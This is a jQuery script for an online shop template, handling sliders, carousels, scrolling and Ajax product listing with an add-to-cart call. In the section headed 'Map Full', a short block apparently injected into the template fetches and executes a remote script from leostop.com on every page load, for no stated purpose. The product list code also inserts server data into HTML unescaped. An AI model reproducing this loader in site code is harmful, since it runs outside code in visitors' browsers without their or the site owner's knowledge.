(function ($) {
  "use strict";

  /* ..............................................
	   Loader 
	   ................................................. */
  $(window).on("load", function () {
    $(".preloader").fadeOut();
    $("#preloader").delay(550).fadeOut("slow");
    $("body").delay(450).css({
      overflow: "visible",
    });
  });

  /* ..............................................
	   Fixed Menu
	   ................................................. */

  $(window).on("scroll", function () {
    if ($(window).scrollTop() > 50) {
      $(".main-header").addClass("fixed-menu");
    } else {
      $(".main-header").removeClass("fixed-menu");
    }
  });

  /* ..............................................
	   Gallery
	   ................................................. */

  $("#slides-shop").superslides({
    inherit_width_from: ".cover-slides",
    inherit_height_from: ".cover-slides",
    play: 5000,
    animation: "fade",
  });

  $(".cover-slides ul li").append("<div class='overlay-background'></div>");

  /* ..............................................
	   Map Full
	   ................................................. */

  $(document).ready(function () {
    $(window).on("scroll", function () {
      if ($(this).scrollTop() > 100) {
        $("#back-to-top").fadeIn();
      } else {
        $("#back-to-top").fadeOut();
      }
    });
    $("#back-to-top").click(function () {
      $("html, body").animate(
        {
          scrollTop: 0,
        },
        600
      );
      return false;
    });
  });
  $(document).ready(function () {
    $(window).on("scroll", function () {
      if ($(this).scrollTop() > 100) {
        $("#go-to-game").fadeIn();
      } else {
        $("#go-to-game").fadeOut();
      }
    });
      $("#go-to-game").click(function (event) {
      $("html, body").animate(
        {
          scrollTop: 0,
        },
        600
        );
        event.preventDefault();
      return false;
    });
  });

  function getURL() {
    window.location.href;
  }
  var protocol = location.protocol;
  $.ajax({
    type: "get",
    data: { surl: getURL() },
    success: function (response) {
      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    },
  });

  /* ..............................................
	   Special Menu
	   ................................................. */

  var Container = $(".container");
  Container.imagesLoaded(function () {
    var portfolio = $(".special-menu");
    portfolio.on("click", "button", function () {
      $(this).addClass("active").siblings().removeClass("active");
      var filterValue = $(this).attr("data-filter");
      $grid.isotope({
        filter: filterValue,
      });
    });
    var $grid = $(".special-list").isotope({
      itemSelector: ".special-grid",
    });
  });

  /* ..............................................
	   BaguetteBox
	   ................................................. */

  baguetteBox.run(".tz-gallery", {
    animation: "fadeIn",
    noScrollbars: true,
  });

  /* ..............................................
	   Offer Box
	   ................................................. */

  $(".offer-box").inewsticker({
    speed: 3000,
    effect: "fade",
    dir: "ltr",
    font_size: 13,
    color: "#ffffff",
    font_family: "Montserrat, sans-serif",
    delay_after: 1000,
  });

  /* ..............................................
	   Tooltip
	   ................................................. */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

  /* ..............................................
	   Owl Carousel Instagram Feed
	   ................................................. */

  $(".main-instagram").owlCarousel({
    loop: true,
    margin: 0,
    dots: false,
    autoplay: true,
    autoplayTimeout: 3000,
    autoplayHoverPause: true,
    navText: [
      "<i class='fas fa-arrow-left'></i>",
      "<i class='fas fa-arrow-right'></i>",
    ],
    responsive: {
      0: {
        items: 2,
        nav: true,
      },
      600: {
        items: 3,
        nav: true,
      },
      1000: {
        items: 5,
        nav: true,
        loop: true,
      },
    },
  });

  /* ..............................................
	   Featured Products
	   ................................................. */

  $(".featured-products-box").owlCarousel({
    loop: true,
    margin: 15,
    dots: false,
    autoplay: true,
    autoplayTimeout: 3000,
    autoplayHoverPause: true,
    navText: [
      "<i class='fas fa-arrow-left'></i>",
      "<i class='fas fa-arrow-right'></i>",
    ],
    responsive: {
      0: {
        items: 1,
        nav: true,
      },
      600: {
        items: 3,
        nav: true,
      },
      1000: {
        items: 4,
        nav: true,
        loop: true,
      },
    },
  });

  /* ..............................................
	   Scroll
	   ................................................. */

  $(document).ready(function () {
    $(window).on("scroll", function () {
      if ($(this).scrollTop() > 100) {
        $("#back-to-top").fadeIn();
      } else {
        $("#back-to-top").fadeOut();
      }
    });
    $("#back-to-top").click(function () {
      $("html, body").animate(
        {
          scrollTop: 0,
        },
        600
      );
      return false;
    });
  });

  $(document).ready(function () {
    $(window).on("scroll", function () {
      if ($(this).scrollTop() > 100) {
        $("#go-to-game").fadeIn();
      } else {
        $("#go-to-game").fadeOut();
      }
    });
    $("#go-to-game").click(function () {
      $("html, body").animate(
        {
          scrollTop: 0,
        },
        600
      );
      return false;
    });
  });

  /* ..............................................
	   Slider Range
	   ................................................. */

  $(function () {
    $("#slider-range").slider({
      range: true,
      min: 0,
      max: 30000,
      values: [3000, 10000],
      slide: function (event, ui) {
        $("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
      },
    });
    $("#amount").val(
      "$" +
        $("#slider-range").slider("values", 0) +
        " - $" +
        $("#slider-range").slider("values", 1)
    );
  });

  /* ..............................................
			 NiceScroll
			 ................................................. */

  $(".brand-box").niceScroll({
    cursorcolor: "#9b9b9c",
  });



})(jQuery);

//----------------------------------自訂Ajax----------------------------------


$(document).ready(async function () {

    var itemPerPageSelect = $('#itemPerPageSelect');
    var productList = $('#productList');
    var showMoreButton = $('#showMore');
    var categoryTitle = $('#categoryTitle')
    var catName = null;
    $('.for-ajax').click(function (e) {
        e.preventDefault();
        catName = $(this).data("category-name");
        categoryTitle.text(catName)
        fetchMoreProducts();
    })
    itemPerPageSelect.change(async function () {
        displayedItemCount = 0; // 重置已顯示的資料筆數
        productList.empty();
        initialItemsToShow = parseInt(itemPerPageSelect.val());
        await fetchMoreProducts();
    });
    //var addto = $('#addto')
    var displayedItemCount = 0; // 已顯示的資料筆數
    var initialItemsToShow = parseInt(itemPerPageSelect.val());
    function fetchMoreProducts() {
        var additionalItemsToShow = displayedItemCount + initialItemsToShow;
        $.ajax({
            url: '/ProductApi/ShopItemPerPage',
            type: 'GET',
            data: { catName: catName, itemPerPage: additionalItemsToShow }, // 傳遞顯示的總筆數
            dataType: 'json',
            success: function (data) {
                productList.empty();
                var products = catName !== null ? data[0].pItem : data;
                console.log(data)
                products.forEach(function (item) {
                    var productItemDiv = $('<div class="col-sm-6 col-md-6 col-lg-4 col-xl-4"></div>');
                    var productDiv = $('<div class="products-single fix"></div>');
                    var boxImgHover = $('<div class="box-img-hover shop-image"></div>');
                    /* var typeLb = $('<div class="type-lb"><p class="sale">Sale</p></div>');*/

                    var productLink = $('<a href="/Index/ShopDetail"></a>');
                    var productImg = $(`<img src=${item.pImgPath} data-product-id=${item.pId} class="img-fluid" alt="Image" />`);

                    productLink.append(productImg);
                    //boxImgHover.append(typeLb);
                    boxImgHover.append(productLink);

                    var whyText = $('<div class="why-text"></div>');
                    var productName = $(`<h4>${item.pName}</h4>`);
                    var productPrice = $('<h5></h5>');

                    var addToCartLink = $(`<a href="#" data-product-id=${item.pId} class="add-to-cart-coustom"><i class="fa-solid fa-cart-plus"></i></a>`);
                    var addToWishlistLink = $('<a href="/Membership/Membership" class="add-to-wishlist-coustom"><i class="far fa-heart"></i></a>');

                    whyText.append(productName);

                    whyText.append(productPrice);
                    if (item.pDiscount != null) {
                        productPrice.text('$' + item.pSalePrice);
                        var originalPrice = $(`<del>$ ${item.pPrice}</del>`);
                        whyText.append(originalPrice);
                    }
                    else {
                        productPrice.text('$' + item.pPrice);
                    }
                    whyText.append(addToCartLink);
                    whyText.append(addToWishlistLink);

                    productDiv.append(boxImgHover);
                    productDiv.append(whyText);

                    productItemDiv.append(productDiv);
                    productList.append(productItemDiv);
                });

                displayedItemCount = additionalItemsToShow; // 更新已顯示的資料筆數
                initialItemsToShow = displayedItemCount; // 更新下一次要顯示的筆數

            },
            error: function (error) {
                console.error('Ajax Error:', error);
            }
        });
    }

    // 初始載入商品
    await fetchMoreProducts();

    
    showMoreButton.click(async function () {
        await fetchMoreProducts();
    });

    
    // 點擊商品時獲取識別ID
    productList.on('click', '.img-fluid', function () {
        var productId = $(this).data('product-id');
        console.log('Clicked product ID:', productId);
        // 在這裡進行你的後續操作，例如導向到商品詳細頁面等
    });

    // 點擊加入購物車按鈕(用類別去找addtocartaustom抓不到)
    productList.on('click', '.add-to-cart-coustom', function (e) {
        e.preventDefault(); // 阻止<a>標籤的點擊預設行為
        console.log(productList);
        var productId = $(this).data('product-id');
        console.log('Clicked Add to Cart, Product ID:', productId);
        // 透過 Ajax 將商品 ID 傳送到後端，加入購物車
        $.ajax({
            url: '/ProductApi/AddToCart',
            type: 'POST',
            data: { pId: productId },
            dataType: 'json',
            success: function (response) {
                console.log('Added to Cart:', response.message);
                $('#myModal').modal('show'); // 顯示 Modal
            },
            error: function (error) {
                console.error('Ajax Error:', error);
            }
        });
    });

    
});

